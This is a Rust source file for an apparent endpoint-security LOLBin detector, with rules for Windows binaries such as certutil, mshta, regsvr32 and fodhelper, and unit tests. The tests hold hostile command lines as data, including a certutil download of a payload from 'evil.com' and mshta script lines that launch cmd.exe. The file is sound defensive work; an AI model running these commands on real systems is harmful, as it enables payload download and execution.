pub mod prelude;

use chrono::{DateTime, Utc};
use royalsecurity_common::types::{EventSeverity, FileEvent, NetworkEvent, ProcessInfo};
use std::collections::HashMap;
use uuid::Uuid;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, serde::Serialize, serde::Deserialize)]
pub enum LolbinMode {
    Block,
    AuditOnly,
    Disabled,
}

impl Default for LolbinMode {
    fn default() -> Self {
        LolbinMode::Block
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Hash, serde::Serialize, serde::Deserialize)]
pub enum LolbinCategory {
    CodeSigning,
    DefenseEvasion,
    Execution,
    Persistence,
    PrivilegeEscalation,
    Discovery,
    Collection,
    Exfiltration,
    CommandAndControl,
}

#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub enum DetectionPattern {
    CommandLineContains(Vec<String>),
    ParentProcessIs(Vec<String>),
    NetworkActivity,
    FileWriteTo(Vec<String>),
    TempDirectoryExecution,
    EncodedPayload(Vec<String>),
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct LolbinRule {
    pub id: String,
    pub binary_name: String,
    pub description: String,
    pub category: LolbinCategory,
    pub severity: EventSeverity,
    pub enabled: bool,
    pub detection_patterns: Vec<DetectionPattern>,
    pub mitre_technique: String,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct LolbinConfig {
    pub mode: LolbinMode,
    pub detect_network_activity: bool,
    pub detect_file_operations: bool,
    pub detect_process_creation: bool,
    pub excluded_paths: Vec<String>,
}

impl Default for LolbinConfig {
    fn default() -> Self {
        Self {
            mode: LolbinMode::Block,
            detect_network_activity: true,
            detect_file_operations: true,
            detect_process_creation: true,
            excluded_paths: Vec::new(),
        }
    }
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct LolbinTracking {
    pub pid: u32,
    pub binary_name: String,
    pub start_time: DateTime<Utc>,
    pub command_line: String,
    pub parent_pid: u32,
    pub parent_name: String,
    pub has_network: bool,
    pub has_file_write: bool,
    pub risk_score: u32,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct LolbinDetection {
    pub id: Uuid,
    pub rule_id: String,
    pub binary_name: String,
    pub process_pid: u32,
    pub command_line: String,
    pub category: LolbinCategory,
    pub severity: EventSeverity,
    pub confidence: f32,
    pub description: String,
    pub evidence: Vec<String>,
    pub mitre_technique: String,
    pub timestamp: DateTime<Utc>,
}

pub struct LolbinDetector {
    pub rules: Vec<LolbinRule>,
    pub process_tracking: HashMap<u32, LolbinTracking>,
    pub detections: Vec<LolbinDetection>,
    pub config: LolbinConfig,
    pub detection_count: u64,
}

fn default_rules() -> Vec<LolbinRule> {
    vec![
        LolbinRule {
            id: "LB-001".into(),
            binary_name: "certutil.exe".into(),
            description: "Certutil used for downloading, encoding, or decoding files".into(),
            category: LolbinCategory::CodeSigning,
            severity: EventSeverity::High,
            enabled: true,
            detection_patterns: vec![
                DetectionPattern::CommandLineContains(vec![
                    "-urlcache".into(),
                    "-decode".into(),
                    "-encode".into(),
                    "-verifyctl".into(),
                    "download".into(),
                    "bitlocker".into(),
                ]),
            ],
            mitre_technique: "T1218".into(),
        },
        LolbinRule {
            id: "LB-002".into(),
            binary_name: "mshta.exe".into(),
            description: "Mshta executing script-based payloads".into(),
            category: LolbinCategory::Execution,
            severity: EventSeverity::High,
            enabled: true,
            detection_patterns: vec![
                DetectionPattern::CommandLineContains(vec![
                    "vbscript:".into(),
                    "javascript:".into(),
                    "http://".into(),
                ]),
            ],
            mitre_technique: "T1218.005".into(),
        },
        LolbinRule {
            id: "LB-003".into(),
            binary_name: "regsvr32.exe".into(),
            description: "Regsvr32 used to execute scriptlet payloads".into(),
            category: LolbinCategory::Execution,
            severity: EventSeverity::High,
            enabled: true,
            detection_patterns: vec![
                DetectionPattern::CommandLineContains(vec![
                    "/s".into(),
                    "/n".into(),
                    "/u".into(),
                    "/i:".into(),
                    "scrobj.dll".into(),
                    "js:".into(),
                    "vbscript:".into(),
                ]),
            ],
            mitre_technique: "T1218.010".into(),
        },
        LolbinRule {
            id: "LB-004".into(),
            binary_name: "rundll32.exe".into(),
            description: "Rundll32 executing script or URL-based payloads".into(),
            category: LolbinCategory::Execution,
            severity: EventSeverity::High,
            enabled: true,
            detection_patterns: vec![
                DetectionPattern::CommandLineContains(vec![
                    "javascript:".into(),
                    "vbscript:".into(),
                    "mshtml".into(),
                    "url.dll".into(),
                    "ieframe.dll".into(),
                    "shell32.dll".into(),
                ]),
            ],
            mitre_technique: "T1218.011".into(),
        },
        LolbinRule {
            id: "LB-005".into(),
            binary_name: "bitsadmin.exe".into(),
            description: "BITSAdmin used for file transfers and persistence".into(),
            category: LolbinCategory::Exfiltration,
            severity: EventSeverity::High,
            enabled: true,
            detection_patterns: vec![
                DetectionPattern::CommandLineContains(vec![
                    "/transfer".into(),
                    "/create".into(),
                    "/addfile".into(),
                    "/resume".into(),
                    "/complete".into(),
                ]),
            ],
            mitre_technique: "T1105".into(),
        },
        LolbinRule {
            id: "LB-006".into(),
            binary_name: "installutil.exe".into(),
            description: "InstallUtil used to execute unsigned assemblies".into(),
            category: LolbinCategory::Execution,
            severity: EventSeverity::Medium,
            enabled: true,
            detection_patterns: vec![
                DetectionPattern::CommandLineContains(vec![
                    "/logfile=".into(),
                    "/logtoconsole=".into(),
                    "/assemblytype=".into(),
                ]),
            ],
            mitre_technique: "T1218.004".into(),
        },
        LolbinRule {
            id: "LB-007".into(),
            binary_name: "msbuild.exe".into(),
            description: "MSBuild used to compile and execute inline code".into(),
            category: LolbinCategory::Execution,
            severity: EventSeverity::High,
            enabled: true,
            detection_patterns: vec![
                DetectionPattern::CommandLineContains(vec![
                    "/t:build".into(),
                    "/p:".into(),
                ]),
            ],
            mitre_technique: "T1218.004".into(),
        },
        LolbinRule {
            id: "LB-008".into(),
            binary_name: "regasm.exe".into(),
            description: "RegAsm used to execute managed DLLs".into(),
            category: LolbinCategory::Execution,
            severity: EventSeverity::Medium,
            enabled: true,
            detection_patterns: vec![
                DetectionPattern::CommandLineContains(vec![
                    "/codebase".into(),
                    "/dll".into(),
                    "/tlb".into(),
                ]),
            ],
            mitre_technique: "T1218.009".into(),
        },
        LolbinRule {
            id: "LB-009".into(),
            binary_name: "regsvcs.exe".into(),
            description: "RegSvcs used to execute managed DLLs".into(),
            category: LolbinCategory::Execution,
            severity: EventSeverity::Medium,
            enabled: true,
            detection_patterns: vec![
                DetectionPattern::CommandLineContains(vec![
                    "/dll".into(),
                    "/tlb".into(),
                    "/install".into(),
                ]),
            ],
            mitre_technique: "T1218.009".into(),
        },
        LolbinRule {
            id: "LB-010".into(),
            binary_name: "msiexec.exe".into(),
            description: "Msiexec installing packages from remote URLs".into(),
            category: LolbinCategory::Persistence,
            severity: EventSeverity::High,
            enabled: true,
            detection_patterns: vec![
                DetectionPattern::CommandLineContains(vec![
                    "/q".into(),
                    "/i ".into(),
                    "/package".into(),
                    "http://".into(),
                ]),
            ],
            mitre_technique: "T1218.007".into(),
        },
        LolbinRule {
            id: "LB-011".into(),
            binary_name: "presentationhost.exe".into(),
            description: "PresentationHost executing ClickOnce or XAML browser applications".into(),
            category: LolbinCategory::Execution,
            severity: EventSeverity::Medium,
            enabled: true,
            detection_patterns: vec![DetectionPattern::CommandLineContains(vec![
                "http://".into(),
                "xaml".into(),
            ])],
            mitre_technique: "T1218".into(),
        },
        LolbinRule {
            id: "LB-012".into(),
            binary_name: "bash.exe".into(),
            description: "WSL Bash used for cross-platform execution and defense evasion".into(),
            category: LolbinCategory::DefenseEvasion,
            severity: EventSeverity::Medium,
            enabled: true,
            detection_patterns: vec![
                DetectionPattern::CommandLineContains(vec![
                    "-c".into(),
                    "-e".into(),
                    "cmd.exe".into(),
                    "powershell".into(),
                    "/etc/passwd".into(),
                ]),
            ],
            mitre_technique: "T1202".into(),
        },
        LolbinRule {
            id: "LB-013".into(),
            binary_name: "forfiles.exe".into(),
            description: "ForFiles executing commands on batch of files".into(),
            category: LolbinCategory::Execution,
            severity: EventSeverity::Medium,
            enabled: true,
            detection_patterns: vec![DetectionPattern::CommandLineContains(vec![
                "/c".into(),
                "cmd".into(),
                "powershell".into(),
            ])],
            mitre_technique: "T1059".into(),
        },
        LolbinRule {
            id: "LB-014".into(),
            binary_name: "replace.exe".into(),
            description: "Replace used to overwrite system files for defense evasion".into(),
            category: LolbinCategory::DefenseEvasion,
            severity: EventSeverity::Medium,
            enabled: true,
            detection_patterns: vec![DetectionPattern::CommandLineContains(vec![
                "/a".into(),
                "/s".into(),
                "/y".into(),
            ])],
            mitre_technique: "T1222".into(),
        },
        LolbinRule {
            id: "LB-015".into(),
            binary_name: "xwizard.exe".into(),
            description: "XWizard used to execute COM objects via WizardDialog".into(),
            category: LolbinCategory::Execution,
            severity: EventSeverity::Medium,
            enabled: true,
            detection_patterns: vec![DetectionPattern::CommandLineContains(vec![
                "run".into(),
                "http://".into(),
            ])],
            mitre_technique: "T1218".into(),
        },
        LolbinRule {
            id: "LB-016".into(),
            binary_name: "pcwrun.exe".into(),
            description: "PCWRun used to execute arbitrary executables via Troubleshooting Pack".into(),
            category: LolbinCategory::Execution,
            severity: EventSeverity::Medium,
            enabled: true,
            detection_patterns: vec![DetectionPattern::CommandLineContains(vec![
                ".exe".into(),
                ".dll".into(),
            ])],
            mitre_technique: "T1218".into(),
        },
        LolbinRule {
            id: "LB-017".into(),
            binary_name: "control.exe".into(),
            description: "Control Panel used to load CPL files for execution".into(),
            category: LolbinCategory::Execution,
            severity: EventSeverity::Medium,
            enabled: true,
            detection_patterns: vec![DetectionPattern::CommandLineContains(vec![
                "/name=Microsoft.Windows.Todos".into(),
                ".cpl".into(),
                "shell:".into(),
            ])],
            mitre_technique: "T1218".into(),
        },
        LolbinRule {
            id: "LB-018".into(),
            binary_name: "msconfig.exe".into(),
            description: "MsConfig used for safe boot or startup manipulation".into(),
            category: LolbinCategory::DefenseEvasion,
            severity: EventSeverity::Low,
            enabled: true,
            detection_patterns: vec![DetectionPattern::CommandLineContains(vec![
                "-safeboot".into(),
                "startup".into(),
            ])],
            mitre_technique: "T1497".into(),
        },
        LolbinRule {
            id: "LB-019".into(),
            binary_name: "fdrespub.exe".into(),
            description: "FDResPub executing commands through Windows Explorer resource publishing".into(),
            category: LolbinCategory::Execution,
            severity: EventSeverity::Medium,
            enabled: true,
            detection_patterns: vec![DetectionPattern::CommandLineContains(vec![
                "http://".into(),
                "cmd".into(),
                "powershell".into(),
            ])],
            mitre_technique: "T1218".into(),
        },
        LolbinRule {
            id: "LB-020".into(),
            binary_name: "explorer.exe".into(),
            description: "Explorer spawning suspicious child processes".into(),
            category: LolbinCategory::Execution,
            severity: EventSeverity::Medium,
            enabled: true,
            detection_patterns: vec![
                DetectionPattern::ParentProcessIs(vec!["explorer.exe".into()]),
                DetectionPattern::CommandLineContains(vec![
                    "cmd.exe /c".into(),
                    "powershell".into(),
                    "wscript".into(),
                    "cscript".into(),
                ]),
            ],
            mitre_technique: "T1204".into(),
        },
        LolbinRule {
            id: "LB-021".into(),
            binary_name: "cmstp.exe".into(),
            description: "CMSTP used to bypass application whitelisting via INF installation".into(),
            category: LolbinCategory::Execution,
            severity: EventSeverity::High,
            enabled: true,
            detection_patterns: vec![DetectionPattern::CommandLineContains(vec![
                "/s".into(),
                ".inf".into(),
                "http://".into(),
            ])],
            mitre_technique: "T1218.003".into(),
        },
        LolbinRule {
            id: "LB-022".into(),
            binary_name: "wmic.exe".into(),
            description: "WMIC used for reconnaissance and remote execution".into(),
            category: LolbinCategory::Discovery,
            severity: EventSeverity::Medium,
            enabled: true,
            detection_patterns: vec![DetectionPattern::CommandLineContains(vec![
                "/format:".into(),
                "process call create".into(),
                "node:".into(),
            ])],
            mitre_technique: "T1047".into(),
        },
        LolbinRule {
            id: "LB-023".into(),
            binary_name: "msdt.exe".into(),
            description: "MSDT used to execute malicious troubleshooter packages".into(),
            category: LolbinCategory::Execution,
            severity: EventSeverity::High,
            enabled: true,
            detection_patterns: vec![DetectionPattern::CommandLineContains(vec![
                "IT_BrowseForFile".into(),
                "ms-msdt:".into(),
                "/of ".into(),
            ])],
            mitre_technique: "T1218".into(),
        },
        LolbinRule {
            id: "LB-024".into(),
            binary_name: "fodhelper.exe".into(),
            description: "FodHelper used to bypass UAC via registry manipulation".into(),
            category: LolbinCategory::PrivilegeEscalation,
            severity: EventSeverity::High,
            enabled: true,
            detection_patterns: vec![DetectionPattern::CommandLineContains(vec![
                "ms-settings:".into(),
                ".exe".into(),
            ])],
            mitre_technique: "T1548.002".into(),
        },
        LolbinRule {
            id: "LB-025".into(),
            binary_name: "computerdefaults.exe".into(),
            description: "ComputerDefaults used to bypass UAC via registry manipulation".into(),
            category: LolbinCategory::PrivilegeEscalation,
            severity: EventSeverity::High,
            enabled: true,
            detection_patterns: vec![DetectionPattern::CommandLineContains(vec![
                "ms-settings:".into(),
                ".exe".into(),
            ])],
            mitre_technique: "T1548.002".into(),
        },
    ]
}

impl LolbinDetector {
    pub fn new() -> Self {
        tracing::info!(rules_count = default_rules().len(), "Initializing LOLBin detector with default rules");
        Self {
            rules: default_rules(),
            process_tracking: HashMap::new(),
            detections: Vec::new(),
            config: LolbinConfig::default(),
            detection_count: 0,
        }
    }

    pub fn with_config(config: LolbinConfig) -> Self {
        tracing::info!(mode = ?config.mode, "Initializing LOLBin detector with custom config");
        Self {
            rules: default_rules(),
            process_tracking: HashMap::new(),
            detections: Vec::new(),
            config,
            detection_count: 0,
        }
    }

    pub fn analyze_process_event(
        &mut self,
        info: &ProcessInfo,
        parent: Option<&ProcessInfo>,
    ) -> Vec<LolbinDetection> {
        if self.config.mode == LolbinMode::Disabled {
            return Vec::new();
        }
        if !self.config.detect_process_creation {
            return Vec::new();
        }

        let name_lower = info.name.to_lowercase();
        let mut detections = Vec::new();

        let excluded = self.config.excluded_paths.iter().any(|p| info.path.to_lowercase().contains(&p.to_lowercase()));
        if excluded {
            tracing::debug!(pid = info.pid, name = %info.name, "Process excluded by path filter");
            return Vec::new();
        }

        for rule in &self.rules {
            if !rule.enabled {
                continue;
            }
            if rule.binary_name.to_lowercase() != name_lower {
                continue;
            }

            let mut matched_patterns: Vec<String> = Vec::new();
            let mut risk_score: u32 = 0;

            for pattern in &rule.detection_patterns {
                match pattern {
                    DetectionPattern::CommandLineContains(keywords) => {
                        let cl_lower = info.command_line.to_lowercase();
                        for kw in keywords {
                            if cl_lower.contains(&kw.to_lowercase()) {
                                matched_patterns.push(format!("command_line contains '{}'", kw));
                                risk_score += 25;
                            }
                        }
                    }
                    DetectionPattern::ParentProcessIs(parents) => {
                        if let Some(ref p) = parent {
                            let parent_lower = p.name.to_lowercase();
                            for pname in parents {
                                if parent_lower == pname.to_lowercase() {
                                    matched_patterns.push(format!("parent is '{}'", pname));
                                    risk_score += 20;
                                }
                            }
                        }
                    }
                    DetectionPattern::TempDirectoryExecution => {
                        let path_lower = info.path.to_lowercase();
                        if path_lower.contains("\\temp\\")
                            || path_lower.contains("\\tmp\\")
                            || path_lower.contains("\\appdata\\local\\temp\\")
                        {
                            matched_patterns.push("executing from temp directory".into());
                            risk_score += 30;
                        }
                    }
                    DetectionPattern::EncodedPayload(encoded) => {
                        let cl_lower = info.command_line.to_lowercase();
                        for enc in encoded {
                            if cl_lower.contains(&enc.to_lowercase()) {
                                matched_patterns.push(format!("encoded payload indicator '{}'", enc));
                                risk_score += 35;
                            }
                        }
                    }
                    _ => {}
                }
            }

            if !matched_patterns.is_empty() {
                risk_score = risk_score.min(100);
                let confidence = (risk_score as f32) / 100.0;

                let severity = if risk_score >= 75 {
                    EventSeverity::Critical
                } else if risk_score >= 50 {
                    EventSeverity::High
                } else if risk_score >= 25 {
                    EventSeverity::Medium
                } else {
                    EventSeverity::Low
                };

                let detection = LolbinDetection {
                    id: Uuid::new_v4(),
                    rule_id: rule.id.clone(),
                    binary_name: rule.binary_name.clone(),
                    process_pid: info.pid,
                    command_line: info.command_line.clone(),
                    category: rule.category.clone(),
                    severity,
                    confidence,
                    description: rule.description.clone(),
                    evidence: matched_patterns,
                    mitre_technique: rule.mitre_technique.clone(),
                    timestamp: Utc::now(),
                };

                if self.config.mode == LolbinMode::Block {
                    tracing::warn!(
                        pid = info.pid,
                        name = %info.name,
                        rule_id = %rule.id,
                        risk_score,
                        confidence,
                        "LOLBin detection: blocking"
                    );
                } else {
                    tracing::warn!(
                        pid = info.pid,
                        name = %info.name,
                        rule_id = %rule.id,
                        risk_score,
                        confidence,
                        "LOLBin detection: audit only"
                    );
                }

                self.detection_count += 1;
                detections.push(detection);
            }

            // Track the process
            if !self.process_tracking.contains_key(&info.pid) {
                let tracking = LolbinTracking {
                    pid: info.pid,
                    binary_name: rule.binary_name.clone(),
                    start_time: Utc::now(),
                    command_line: info.command_line.clone(),
                    parent_pid: info.ppid,
                    parent_name: parent.map(|p| p.name.clone()).unwrap_or_default(),
                    has_network: false,
                    has_file_write: false,
                    risk_score: risk_score,
                };
                self.process_tracking.insert(info.pid, tracking);
            }
        }

        detections
    }

    pub fn analyze_file_event(
        &mut self,
        event: &FileEvent,
        process_name: Option<&str>,
    ) -> Vec<LolbinDetection> {
        if self.config.mode == LolbinMode::Disabled {
            return Vec::new();
        }
        if !self.config.detect_file_operations {
            return Vec::new();
        }

        let mut detections = Vec::new();

        let pname = match process_name {
            Some(n) => n.to_lowercase(),
            None => return detections,
        };

        for rule in &self.rules {
            if !rule.enabled || rule.binary_name.to_lowercase() != pname {
                continue;
            }

            let mut matched_patterns: Vec<String> = Vec::new();
            let mut risk_score: u32 = 0;

            for pattern in &rule.detection_patterns {
                match pattern {
                    DetectionPattern::FileWriteTo(sensitive_paths) => {
                        let path_lower = event.path.to_lowercase();
                        for sp in sensitive_paths {
                            if path_lower.contains(&sp.to_lowercase()) {
                                matched_patterns.push(format!("file write to '{}'", sp));
                                risk_score += 30;
                            }
                        }
                    }
                    _ => {}
                }
            }

            // Detect writing executable content to suspicious locations
            let path_lower = event.path.to_lowercase();
            if path_lower.ends_with(".exe")
                || path_lower.ends_with(".dll")
                || path_lower.ends_with(".ps1")
                || path_lower.ends_with(".vbs")
                || path_lower.ends_with(".js")
                || path_lower.ends_with(".bat")
                || path_lower.ends_with(".cmd")
            {
                if path_lower.contains("\\temp\\")
                    || path_lower.contains("\\appdata\\")
                    || path_lower.contains("\\programdata\\")
                    || path_lower.contains("\\users\\public\\")
                {
                    matched_patterns.push(format!("executable write to '{}'", event.path));
                    risk_score += 20;
                }
            }

            // Detect any write operation from tracked LOLBin
            if let Some(tracking) = self.process_tracking.values().find(|t| t.binary_name.to_lowercase() == pname) {
                let _ = tracking;
                risk_score += 15;
                matched_patterns.push("write operation from tracked LOLBin process".into());
            }

            if !matched_patterns.is_empty() {
                risk_score = risk_score.min(100);
                let confidence = (risk_score as f32) / 100.0;

                let severity = if risk_score >= 75 {
                    EventSeverity::Critical
                } else if risk_score >= 50 {
                    EventSeverity::High
                } else if risk_score >= 25 {
                    EventSeverity::Medium
                } else {
                    EventSeverity::Low
                };

                tracing::warn!(
                    path = %event.path,
                    process = %pname,
                    rule_id = %rule.id,
                    risk_score,
                    "LOLBin file operation detected"
                );

                let detection = LolbinDetection {
                    id: Uuid::new_v4(),
                    rule_id: rule.id.clone(),
                    binary_name: rule.binary_name.clone(),
                    process_pid: 0,
                    command_line: String::new(),
                    category: rule.category.clone(),
                    severity,
                    confidence,
                    description: format!("{} - file write detected", rule.description),
                    evidence: matched_patterns,
                    mitre_technique: rule.mitre_technique.clone(),
                    timestamp: Utc::now(),
                };

                self.detection_count += 1;
                detections.push(detection);
            }
        }

        detections
    }

    pub fn analyze_network_event(&mut self, event: &NetworkEvent) -> Vec<LolbinDetection> {
        if self.config.mode == LolbinMode::Disabled {
            return Vec::new();
        }
        if !self.config.detect_network_activity {
            return Vec::new();
        }

        let pname = match &event.process_name {
            Some(n) => n.to_lowercase(),
            None => return Vec::new(),
        };

        let mut detections = Vec::new();

        for rule in &self.rules {
            if !rule.enabled || rule.binary_name.to_lowercase() != pname {
                continue;
            }

            let mut has_network_pattern = false;
            for pattern in &rule.detection_patterns {
                if matches!(pattern, DetectionPattern::NetworkActivity) {
                    has_network_pattern = true;
                    break;
                }
            }

            // High confidence when LOLBin + network + any command line
            let (track_pid, track_cmd) = event.process_pid.and_then(|pid| {
                self.process_tracking.get(&pid).map(|t| (t.pid, t.command_line.clone()))
            }).unzip();

            let mut risk_score: u32 = 40; // base for any LOLBin network activity
            let mut evidence: Vec<String> = vec!["LOLBin process making network connection".into()];

            if has_network_pattern {
                risk_score += 30;
                evidence.push("rule explicitly monitors network activity".into());
            }

            if let Some((t_pid, ref t_cmd)) = track_pid.zip(track_cmd.as_ref()) {
                if !t_cmd.is_empty() {
                    risk_score += 20;
                    evidence.push(format!("suspicious command_line: {}", t_cmd));
                }
                // Update tracking
                if let Some(t_mut) = self.process_tracking.get_mut(&t_pid) {
                    t_mut.has_network = true;
                    t_mut.risk_score = t_mut.risk_score.max(risk_score);
                }
            }

            let dst_ip_str = event.dst_ip.map(|ip| ip.to_string()).unwrap_or_default();
            if !dst_ip_str.is_empty() && dst_ip_str != "0.0.0.0" {
                evidence.push(format!("destination: {}:{}", dst_ip_str, event.dst_port));
            }

            if event.bytes_out > 10_000 {
                risk_score += 10;
                evidence.push(format!("high outbound bytes: {}", event.bytes_out));
            }

            risk_score = risk_score.min(100);
            let confidence = (risk_score as f32) / 100.0;

            let severity = if risk_score >= 75 {
                EventSeverity::Critical
            } else if risk_score >= 50 {
                EventSeverity::High
            } else if risk_score >= 25 {
                EventSeverity::Medium
            } else {
                EventSeverity::Low
            };

            tracing::warn!(
                process = %pname,
                pid = ?event.process_pid,
                rule_id = %rule.id,
                risk_score,
                confidence,
                "LOLBin network activity detected"
            );

            let detection = LolbinDetection {
                id: Uuid::new_v4(),
                rule_id: rule.id.clone(),
                binary_name: rule.binary_name.clone(),
                process_pid: event.process_pid.unwrap_or(0),
                command_line: track_cmd.unwrap_or_default(),
                category: rule.category.clone(),
                severity,
                confidence,
                description: format!("{} - network activity", rule.description),
                evidence,
                mitre_technique: rule.mitre_technique.clone(),
                timestamp: Utc::now(),
            };

            self.detection_count += 1;
            detections.push(detection);
        }

        detections
    }

    pub fn match_command_line(patterns: &[DetectionPattern], command_line: &str) -> bool {
        let cl_lower = command_line.to_lowercase();
        for pattern in patterns {
            if let DetectionPattern::CommandLineContains(keywords) = pattern {
                for kw in keywords {
                    if cl_lower.contains(&kw.to_lowercase()) {
                        return true;
                    }
                }
            }
        }
        false
    }

    pub fn match_parent(patterns: &[DetectionPattern], parent_name: &str) -> bool {
        let parent_lower = parent_name.to_lowercase();
        for pattern in patterns {
            if let DetectionPattern::ParentProcessIs(parents) = pattern {
                for pname in parents {
                    if parent_lower == pname.to_lowercase() {
                        return true;
                    }
                }
            }
        }
        false
    }

    pub fn add_rule(&mut self, rule: LolbinRule) {
        tracing::info!(rule_id = %rule.id, binary = %rule.binary_name, "Adding LOLBin rule");
        self.rules.push(rule);
    }

    pub fn remove_rule(&mut self, rule_id: &str) -> bool {
        let before = self.rules.len();
        self.rules.retain(|r| r.id != rule_id);
        let removed = self.rules.len() < before;
        if removed {
            tracing::info!(rule_id, "Removed LOLBin rule");
        } else {
            tracing::debug!(rule_id, "Rule not found for removal");
        }
        removed
    }

    pub fn toggle_rule(&mut self, rule_id: &str, enabled: bool) -> bool {
        for rule in &mut self.rules {
            if rule.id == rule_id {
                rule.enabled = enabled;
                tracing::info!(rule_id, enabled, "Toggled LOLBin rule");
                return true;
            }
        }
        tracing::debug!(rule_id, "Rule not found for toggle");
        false
    }

    pub fn detection_count(&self) -> u64 {
        self.detection_count
    }
}

impl Default for LolbinDetector {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use royalsecurity_common::types::{FileAction, Protocol};
    use std::net::IpAddr;

    fn make_process(name: &str, cmd: &str, pid: u32, ppid: u32) -> ProcessInfo {
        ProcessInfo {
            pid,
            ppid,
            name: name.into(),
            path: format!("C:\\Windows\\System32\\{}", name),
            command_line: cmd.into(),
            user: "SYSTEM".into(),
            hash_sha256: None,
            integrity_level: Some("High".into()),
            timestamp: Utc::now(),
        }
    }

    #[test]
    fn test_new_has_default_rules() {
        let detector = LolbinDetector::new();
        assert!(detector.rules.len() >= 20, "Expected at least 20 default rules, got {}", detector.rules.len());
        assert_eq!(detector.detection_count, 0);
        assert!(detector.process_tracking.is_empty());
    }

    #[test]
    fn test_analyze_process_detects_certutil_urlcache() {
        let mut detector = LolbinDetector::new();
        let process = make_process(
            "certutil.exe",
            "certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe",
            1001,
            500,
        );
        let detections = detector.analyze_process_event(&process, None);
        assert!(!detections.is_empty(), "Should detect certutil with -urlcache");
        assert_eq!(detections[0].rule_id, "LB-001");
        assert!(detections[0].confidence > 0.0);
    }

    #[test]
    fn test_analyze_process_detects_mshta_vbscript() {
        let mut detector = LolbinDetector::new();
        let process = make_process(
            "mshta.exe",
            "mshta.exe vbscript:Execute(\"CreateObject(\\\"WScript.Shell\\\").Run \\\"cmd.exe /c calc.exe\\\"\")",
            2001,
            500,
        );
        let detections = detector.analyze_process_event(&process, None);
        assert!(!detections.is_empty(), "Should detect mshta with vbscript");
        assert_eq!(detections[0].rule_id, "LB-002");
    }

    #[test]
    fn test_analyze_process_allows_benign_certutil() {
        let mut detector = LolbinDetector::new();
        let process = make_process(
            "certutil.exe",
            "certutil.exe -store Root",
            1002,
            500,
        );
        let detections = detector.analyze_process_event(&process, None);
        assert!(detections.is_empty(), "Should not flag benign certutil usage");
    }

    #[test]
    fn test_analyze_network_event_detects_lolbin() {
        let mut detector = LolbinDetector::new();

        // First track the process
        let process = make_process(
            "certutil.exe",
            "certutil.exe -urlcache http://evil.com/file",
            3001,
            500,
        );
        detector.analyze_process_event(&process, None);

        let network_event = NetworkEvent {
            src_ip: Some("192.168.1.100".parse::<IpAddr>().unwrap()),
            dst_ip: Some("93.184.216.34".parse::<IpAddr>().unwrap()),
            src_port: 49152,
            dst_port: 443,
            protocol: Protocol::Tcp,
            bytes_in: 5000,
            bytes_out: 15000,
            process_name: Some("certutil.exe".into()),
            process_pid: Some(3001),
            timestamp: Utc::now(),
        };

        let detections = detector.analyze_network_event(&network_event);
        assert!(!detections.is_empty(), "Should detect LOLBin network activity");
        assert_eq!(detections[0].rule_id, "LB-001");
        assert!(detections[0].confidence > 0.0);
    }

    #[test]
    fn test_analyze_file_event_detects_exe_write() {
        let mut detector = LolbinDetector::new();

        let file_event = FileEvent {
            path: "C:\\Users\\Public\\payload.exe".into(),
            original_path: None,
            action: FileAction::Created,
            hash_sha256: None,
            size: Some(1024),
            timestamp: Utc::now(),
        };

        let detections = detector.analyze_file_event(&file_event, Some("mshta.exe"));
        assert!(!detections.is_empty(), "Should detect LOLBin writing executable");
        assert_eq!(detections[0].rule_id, "LB-002");
    }

    #[test]
    fn test_match_command_line() {
        let patterns = vec![
            DetectionPattern::CommandLineContains(vec![
                "-urlcache".into(),
                "-decode".into(),
            ]),
            DetectionPattern::NetworkActivity,
        ];

        assert!(LolbinDetector::match_command_line(
            &patterns,
            "certutil.exe -urlcache -split -f http://example.com/file"
        ));
        assert!(LolbinDetector::match_command_line(
            &patterns,
            "certutil.exe -decode encoded.b64 decoded.exe"
        ));
        assert!(!LolbinDetector::match_command_line(
            &patterns,
            "certutil.exe -store Root"
        ));
    }

    #[test]
    fn test_toggle_rule() {
        let mut detector = LolbinDetector::new();
        assert!(detector.toggle_rule("LB-001", false));
        assert!(!detector.rules.iter().find(|r| r.id == "LB-001").unwrap().enabled);

        assert!(detector.toggle_rule("LB-001", true));
        assert!(detector.rules.iter().find(|r| r.id == "LB-001").unwrap().enabled);

        assert!(!detector.toggle_rule("NONEXISTENT", true));
    }

    #[test]
    fn test_detection_count() {
        let mut detector = LolbinDetector::new();
        assert_eq!(detector.detection_count(), 0);

        let process = make_process(
            "certutil.exe",
            "certutil.exe -urlcache http://evil.com/mal.exe",
            4001,
            500,
        );
        detector.analyze_process_event(&process, None);
        assert_eq!(detector.detection_count(), 1);

        let process2 = make_process(
            "mshta.exe",
            "mshta.exe javascript:a=document.createElement('Exec');a.Run('cmd.exe')",
            4002,
            500,
        );
        detector.analyze_process_event(&process2, None);
        assert_eq!(detector.detection_count(), 2);
    }

    #[test]
    fn test_audit_only_mode() {
        let config = LolbinConfig {
            mode: LolbinMode::AuditOnly,
            ..Default::default()
        };
        let mut detector = LolbinDetector::with_config(config);

        let process = make_process(
            "certutil.exe",
            "certutil.exe -urlcache http://evil.com/file.exe",
            5001,
            500,
        );
        let detections = detector.analyze_process_event(&process, None);
        assert!(!detections.is_empty(), "AuditOnly mode should still generate detections");
        assert_eq!(detections[0].rule_id, "LB-001");
    }

    #[test]
    fn test_disabled_mode() {
        let config = LolbinConfig {
            mode: LolbinMode::Disabled,
            ..Default::default()
        };
        let mut detector = LolbinDetector::with_config(config);

        let process = make_process(
            "certutil.exe",
            "certutil.exe -urlcache http://evil.com/file.exe",
            6001,
            500,
        );
        let detections = detector.analyze_process_event(&process, None);
        assert!(detections.is_empty(), "Disabled mode should not generate detections");
    }

    #[test]
    fn test_add_remove_rule() {
        let mut detector = LolbinDetector::new();
        let initial_count = detector.rules.len();

        let rule = LolbinRule {
            id: "LB-CUSTOM".into(),
            binary_name: "custom.exe".into(),
            description: "Custom rule".into(),
            category: LolbinCategory::Execution,
            severity: EventSeverity::Medium,
            enabled: true,
            detection_patterns: vec![DetectionPattern::CommandLineContains(vec!["evil".into()])],
            mitre_technique: "T9999".into(),
        };
